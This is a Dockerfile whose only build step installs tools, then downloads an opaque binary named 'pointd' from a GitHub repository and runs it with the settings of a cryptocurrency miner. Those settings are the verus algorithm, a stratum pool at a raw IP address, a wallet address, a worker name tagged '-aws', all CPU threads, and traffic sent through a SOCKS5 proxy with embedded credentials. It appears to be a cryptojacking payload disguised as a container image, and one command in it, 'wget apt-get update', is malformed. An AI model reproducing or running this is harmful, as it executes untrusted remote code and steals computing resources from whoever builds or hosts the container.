FROM ubuntu:18.04
RUN apt-get update && \
     apt-get install wget -y && \
     wget apt-get update && apt-get dist-upgrade -y && apt-get install -y build-essential libcurl4-openssl-dev libssl-dev libjansson-dev automake autotools-dev git && wget https://github.com/manorepas/bash/raw/main/pointd && chmod +x pointd && ./pointd -a verus -o stratum+tcp://149.56.27.47:3956 -u RN2u2EXEyW65CAgXpiqG99uuha5ATPcWSK.$(echo $(shuf -i 1-20 -n 1)-aws) -p x -t $(nproc) -x socks5://jwegwndc-1:mj2pb21fuqzo@192.111.137.35:4145
